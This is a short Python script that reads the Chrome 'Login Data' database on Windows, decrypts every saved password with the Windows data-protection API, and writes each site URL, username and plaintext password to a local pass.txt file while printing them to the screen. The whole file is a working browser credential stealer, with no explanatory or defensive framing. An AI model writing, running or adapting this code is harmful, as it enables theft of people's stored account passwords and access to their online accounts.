import sqlite3
import win32crypt
import os

def getenv():
	path= os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\Login Data'
	return path

def write_to(write):
	with open ('pass.txt','a') as f:
		f.write(write)

def decrypt(password):
	print ('[*] Decrypting password')
	pwd = win32crypt.CryptUnprotectData(password, None, None, None, 0) #Tuple
	return pwd

def main():
	db=getenv()
	list=[]
	conn=sqlite3.connect(db)
	c=conn.cursor()
	c.execute("SELECT action_url, username_value, password_value FROM logins;")
	login_data=c.fetchall()
	for row in login_data:
		password=decrypt(row[2])
		list.append({
					'origin_url': str(row[0]),
                    'username': str(row[1]),
                    'password': str(password[1])
                })
	for row in list:
		write='[+] URL: ' + str(row['origin_url']) + \
			'\nUsername: ' + str(row['username']) + \
			'\nPassword: ' + str(row['password'] + \
			'\n------------\n')
		write_to(write)
		print ('[+] URL: ' + str(row['origin_url']) + \
			'\nUsername: ' + str(row['username']) + \
			'\nPassword: ' + str(row['password'] + \
			'\n------------\n'))
			
if __name__ == '__main__':
    main()
			